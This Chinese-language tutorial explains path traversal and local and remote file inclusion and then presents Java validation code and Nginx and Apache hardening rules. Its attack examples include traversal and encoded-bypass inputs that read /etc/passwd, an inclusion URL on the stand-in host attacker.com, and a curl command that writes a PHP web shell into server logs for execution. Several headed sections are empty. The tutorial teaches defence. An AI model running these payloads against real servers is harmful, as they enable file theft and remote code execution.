# 路径遍历与文件包含

一个 `.` 带来的灾难。

路径遍历（Path Traversal）和文件包含（File Inclusion）是两类利用文件操作的攻击。攻击者通过构造特殊路径，读取服务器上的敏感文件，甚至执行任意代码。这类漏洞之所以常见，是因为很多开发者错误地将用户输入当作文件路径的一部分。

## 路径遍历

### 漏洞原理

用户输入被直接拼接到文件路径中，没有进行安全验证：

```java
// 危险代码：用户可以指定任意文件
@GetMapping("/download")
public String download(@RequestParam String filename) {
    // 直接使用用户输入
    String filepath = "/var/www/uploads/" + filename;
    return fileService.download(filepath);
}

// 攻击者输入：
// filename=../../../etc/passwd
// 实际路径：/var/www/uploads/../../../etc/passwd
// 解析后：/etc/passwd
```

### 编码绕过技巧

| 原始 | URL 编码 | 双重编码 | Unicode |
|---|---|---|---|
| `../` | `%2e%2e%2f` | `%252e%252e%252f` | `%c0%2e%c0%2e%c0%2f` |
| `/` | `%2f` | `%252f` | - |
| `.` | `%2e` | `%252e` | - |

```java
// 攻击者可以尝试各种编码绕过
// ?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
// ?file=%252e%252e%252fpasswd
```

### 常见危险函数

**Java：**

```java
// FileInputStream
new FileInputStream(userInput);

// File

// Path
Files.readString(Path.of(userInput));

// URL

```

**PHP：**

#### 读取敏感文件

## 文件包含

### 本地文件包含（LFI）

用户输入被当作本地文件路径：

```php
<?php
// LFI 漏洞
$page = $_GET['page'];
include($page);

// 攻击者可以：
// ?page=/etc/passwd
// ?page=../../../../var/log/apache2/access.log
?>
```

**利用 LFI 读取源码：**

```php
<?php
// PHP 文件可能暴露敏感信息
// ?page=config.php
// 可能暴露数据库密码、API 密钥等
?>
```

### 远程文件包含（RFI）

用户输入被当作远程 URL：

```php
<?php
// RFI 漏洞
$module = $_GET['module'];
include($module);  // 包含远程文件

// 攻击者可以：
// ?module=http://attacker.com/shell.txt
// 服务器会下载并执行远程文件
?>
```

:::warning
RFI 需要 `allow_url_include` 开启，PHP 默认是关闭的。
:::

### 文件包含配合日志注入

当无法直接 RFI 时，可以利用日志文件：

```bash
# 步骤1：向日志写入 PHP 代码
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 步骤2：LFI 包含日志文件
# ?page=/var/log/apache2/access.log&cmd=whoami
```

### Session 文件包含

PHP 默认将 Session 存储在 `/tmp` 或 `session.save_path`：

```php
<?php
// PHP 会自动创建 session
session_start();
$_SESSION['username'] = $_GET['username'];

// 如果存在 LFI，可以包含 session 文件
// ?page=/tmp/sess_PHPSESSID&cmd=whoami
?>
```

## 防御策略

### 1. 输入验证（白名单）

```java
// 严格的白名单验证
private static final Set<String> ALLOWED_PAGES = Set.of(
    "home", "about", "contact", "products", "services"
);

public String safeInclude(String page) {
    // 移除路径分隔符
    String safePage = page.replace("/", "").replace("\\", "");

    // 白名单验证
    if (!ALLOWED_PAGES.contains(safePage)) {
        throw new IllegalArgumentException("Page not allowed");
    }

    return safePage + ".html";
}
```

### 2. 路径规范化

```java
import java.nio.file.Path;
import java.nio.file.Paths;

public class SafePathResolver {

    private final Path basePath;

    public SafePathResolver(String basePath) {
        this.basePath = Paths.get(basePath).toAbsolutePath().normalize();
    }

    public Path resolve(String userPath) throws IOException {
        // 禁止空路径
        if (userPath == null || userPath.isEmpty()) {
            throw new IllegalArgumentException("Path cannot be empty");
        }

        // 禁止空字节注入
        if (userPath.contains("\0")) {
            throw new IllegalArgumentException("Null byte injection");
        }

        // 解析用户路径
        Path requestedPath = basePath.resolve(userPath).normalize();

        // 安全检查：确保解析后的路径在 basePath 内
        if (!requestedPath.startsWith(basePath)) {
            throw new SecurityException("Path traversal attempt detected");
        }

        // 验证文件存在
        if (!requestedPath.toFile().exists()) {
            throw new FileNotFoundException("File not found");
        }

        return requestedPath;
    }
}
```

### 4. 使用安全的文件操作函数

```java
// Java：使用 Path API
public class SafeFileHandler {

    private final Path allowedDirectory;

    public SafeFileHandler(String allowedDirectory) {
        this.allowedDirectory = Paths.get(allowedDirectory)
            .toAbsolutePath().normalize();
    }

    public String readFile(String filename) throws IOException {
        // 验证文件名（只允许字母、数字、下划线、连字符、点）
        if (!filename.matches("^[a-zA-Z0-9_\\-\\.]+$")) {
            throw new SecurityException("Invalid filename");
        }

        // 构建完整路径
        Path filePath = allowedDirectory.resolve(filename).normalize();

        // 二次验证：确保在允许目录下
        if (!filePath.startsWith(allowedDirectory)) {
            throw new SecurityException("Path traversal blocked");
        }

        // 读取文件
        return Files.readString(filePath);
    }
}
```

### 5. Web 服务器配置

**Nginx：**

```nginx
server {
    root /var/www/html;

    # 禁止访问敏感目录
    location /uploads/ {
        # 只允许特定扩展名
        location ~* \.(jpg|jpeg|png|gif)$ {
            add_header Content-Type image/jpeg;
        }
        # 其他文件拒绝
        deny all;
    }

    # 禁止访问隐藏文件
    location ~ /\. {
        deny all;
    }

    # 禁止访问配置、日志文件
    location ~* \.(ini|log|conf|sql)$ {
        deny all;
    }
}
```

**Apache：**

```apache
# .htaccess
# 禁止目录遍历
Options -Indexes

# 禁止访问敏感文件
<FilesMatch "\.(env|log|ini|conf)$">
    Order Allow,Deny
    Deny from all
</FilesMatch>

# 限制文件上传目录
<Directory "/var/www/uploads">
    <FilesMatch "\.php$">
        Order Allow,Deny
        Deny from all
    </FilesMatch>
</Directory>
```

## 完整防御方案

```java
@Service
public class SecureFileService {

    private static final Path UPLOAD_DIR = Paths.get("/var/www/uploads").normalize();
    private static final Set<String> ALLOWED_EXTENSIONS = Set.of("jpg", "png", "pdf", "docx");
    private static final Pattern SAFE_FILENAME = Pattern.compile("^[a-zA-Z0-9_\\-.]+$");

    private final Path basePath;

    public SecureFileService() {
        this.basePath = UPLOAD_DIR;
    }

    public Path resolveFile(String userFilename) {
        // 1. 空值检查
        if (userFilename == null || userFilename.isBlank()) {
            throw new IllegalArgumentException("Filename required");
        }

        // 2. 空字节检查
        if (userFilename.contains("\0")) {
            throw new SecurityException("Invalid filename");
        }

        // 3. 路径遍历检查
        if (userFilename.contains("..") ||
            userFilename.contains("/") ||
            userFilename.contains("\\")) {
            throw new SecurityException("Path traversal attempt");
        }

        // 4. 文件名格式检查
        if (!SAFE_FILENAME.matcher(userFilename).matches()) {
            throw new SecurityException("Invalid filename format");
        }

        // 5. 扩展名检查
        String extension = getExtension(userFilename).toLowerCase();
        if (!ALLOWED_EXTENSIONS.contains(extension)) {
            throw new SecurityException("File type not allowed");
        }

        // 6. 构建并验证路径
        Path resolved = basePath.resolve(userFilename).normalize();

        if (!resolved.startsWith(basePath)) {
            throw new SecurityException("Path outside base directory");
        }

        return resolved;
    }

    public String readSafeFile(String filename) throws IOException {
        Path filePath = resolveFile(filename);
        return Files.readString(filePath);
    }
}
```
